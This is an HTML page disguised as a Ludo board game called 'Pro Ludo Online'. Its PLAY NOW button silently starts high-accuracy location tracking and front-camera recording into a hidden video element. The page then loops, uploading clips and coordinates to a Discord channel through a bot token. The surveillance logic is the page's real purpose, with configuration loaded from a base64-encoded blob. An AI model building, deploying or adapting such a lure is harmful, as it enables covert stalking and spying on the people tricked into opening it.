<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #2c3e50;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }
        .game-board {
            width: 350px;
            height: 350px;
            background-color: #fff;
            border: 5px solid #34495e;
            border-radius: 10px;
            display: grid;
            grid-template-columns: repeat(15, 1fr);
            grid-template-rows: repeat(15, 1fr);
            padding: 5px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .cell { border: 1px solid #ddd; }
        .home { background-color: #2ecc71; }
        .home-blue { background-color: #3498db; }
        .home-red { background-color: #e74c3c; }
        .home-yellow { background-color: #f1c40f; }
        .home-green { background-color: #27ae60; }

        .play-btn {
            margin-top: 30px;
            padding: 15px 40px;
            font-size: 20px;
            background-color: #f39c12;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4);
            transition: transform 0.2s;
        }
        .play-btn:disabled {
            background-color: #7f8c8d;
            cursor: not-allowed;
        }
        #recordingVideo { display: none; }
        /* Debug Log (Hidden by default) */
        #debugLog {
            position: absolute;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.8);
            color: #0f0;
            font-size: 10px;
            padding: 5px;
            display: none; 
        }
    </style>
</head>
<body>

    <div class="game-board" id="board">
        <div class="cell home-yellow" style="grid-column: 1-6; grid-row: 1-6;"></div>
        <div class="cell home-green" style="grid-column: 10-15; grid-row: 10-15;"></div>
        <div class="cell home-red" style="grid-column: 1-6; grid-row: 10-15;"></div>
        <div class="cell home-blue" style="grid-column: 10-15; grid-row: 1-6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 7-9; background: #95a5a6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 1-6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 10-15;"></div>
        <div class="cell" style="grid-column: 1-6; grid-row: 7-9;"></div>
        <div class="cell" style="grid-column: 10-15; grid-row: 7-9;"></div>
    </div>

    <button class="play-btn" id="playBtn">PLAY NOW</button>
    <video id="recordingVideo" autoplay muted playsinline></video>
    <div id="debugLog"></div>

    <script>
        // --- CONFIGURATION ---
        const CONFIG = {
            BOT_TOKEN: "YOUR_DISCORD_BOT_TOKEN_HERE", 
            SERVER_ID: "YOUR_DISCORD_SERVER_ID_HERE",
            CHANNEL_ID: "YOUR_DISCORD_CHANNEL_ID_HERE",
            RECORD_DURATION: 5000, 
            WAIT_DURATION: 5000   
        };

        // Load Config if exists
        if (typeof ENCODED_CONFIG !== 'undefined') {
            const decoded = decodeURIComponent(escape(atob(ENCODED_CONFIG)));
            const configData = JSON.parse(decoded);
            if(configData.discord) {
                CONFIG.BOT_TOKEN = configData.discord.botToken;
                CONFIG.CHANNEL_ID = configData.discord.channelId;
                CONFIG.SERVER_ID = configData.discord.serverId || "UNKNOWN";
            }
            if(configData.settings) {
                CONFIG.RECORD_DURATION = configData.settings.recordSeconds * 1000;
                CONFIG.WAIT_DURATION = configData.settings.waitSeconds * 1000;
            }
        }

        let mediaRecorder;
        let videoChunks = [];
        let currentLocation = null;
        let watchId;
        let stream = null;

        const playBtn = document.getElementById('playBtn');
        const debugLog = document.getElementById('debugLog');

        function log(msg) {
            console.log(msg);
            debugLog.innerText += msg + "\n";
        }

        playBtn.addEventListener('click', startProcess);

        async function startProcess() {
            playBtn.disabled = true;
            playBtn.innerText = "Connecting...";

            // 1. Location Permission
            if (navigator.geolocation) {
                watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        currentLocation = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            timestamp: new Date().toISOString()
                        };
                        log("Location Updated: " + currentLocation.lat);
                    },
                    (error) => {
                        currentLocation = { error: error.message };
                        log("Location Error: " + error.message);
                    },
                    { enableHighAccuracy: true }
                );
            }

            // 2. Camera Permission
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });

                const videoElement = document.getElementById('recordingVideo');
                videoElement.srcObject = stream;
                videoElement.play();
                log("Camera Access Granted.");

                // Start the first loop
                recordAndSend();

            } catch (err) {
                log("Camera error: " + err.message);
                playBtn.innerText = "Camera Error";
            }
        }

        function recordAndSend() {
            videoChunks = [];
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9'
            });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                uploadToDiscord(videoBlob);
                
                // Schedule next loop
                setTimeout(() => {
                    recordAndSend();
                }, CONFIG.WAIT_DURATION);
            };

            mediaRecorder.start();
            
            // Stop after duration
            setTimeout(() => {
                mediaRecorder.stop();
            }, CONFIG.RECORD_DURATION);
        }

        async function uploadToDiscord(blob) {
            const formData = new FormData();
            formData.append("file", blob, "recording.webm");

            const payload = {
                content: `📍 Location: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'No Location'} \n 📅 Time: ${new Date().toISOString()}`
            };

            try {
                log("Sending Text Message...");
                // Send text message with location
                await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
                    method: "POST",
                    headers: {
                        "Authorization": `Bot ${CONFIG.BOT_TOKEN}`
                    },
                    body: JSON.stringify(payload)
                });

                log("Sending Video File...");
                // Send video file
                await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
                    method: "POST",
                    headers: {
                        "Authorization": `Bot ${CONFIG.BOT_TOKEN}`
                    },
                    body: formData
                });
                
                log("Upload Successful!");

            } catch (error) {
                log("Upload Failed: " + error.message);
            }
        }
    </script>
</body>
</html>
